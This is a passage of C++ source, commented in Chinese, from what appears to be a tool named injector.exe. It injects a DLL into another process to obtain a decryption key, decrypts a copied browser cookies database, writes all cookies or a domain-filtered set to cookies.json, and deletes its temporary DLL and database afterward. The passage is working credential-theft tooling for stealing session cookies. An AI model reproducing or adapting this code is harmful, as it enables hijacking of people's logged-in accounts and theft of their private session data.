                    CloseHandle(hcf);
                }
                free(cookiesBuf);

                // 解密并导出到当前目录下的 cookies.json
                // 命令行可选参数：injector.exe [domain_filter]
                const wchar_t* domainFilter = (argc >= 2) ? argv[1] : nullptr;
                if (domainFilter)
                    wprintf(L"[*] 域名过滤: %s\n", domainFilter);
                else
                    wprintf(L"[*] 导出全部 cookie\n");

                // 输出路径 = 当前工作目录 / cookies.json
                wchar_t outPath[MAX_PATH];
                GetCurrentDirectoryW(MAX_PATH, outPath);
                wcscat_s(outPath, L"\\cookies.json");

                DecryptAndExport(tmpCookies, masterKey, outPath, domainFilter);

                // 清理临时 DB
                DeleteFileW(tmpCookies);
            }
        }
    } else {
        wprintf(L"[!] DecryptData 失败: HR=0x%08X\n", hrResult);
    }

    // Cleanup
    if (hThread) { WaitForSingleObject(hThread, 2000); CloseHandle(hThread); }
    CloseHandle(hPipe);
    // Free remote memory after thread finishes
    Sleep(500);
    VirtualFreeEx(hProc, remoteBase, 0, MEM_RELEASE);
    CloseHandle(hProc);
    free(dllData_saved);

    // Delete temp DLL
    DeleteFileW(tmpPath);

    return hrResult == 0 ? 0 : 1;
}
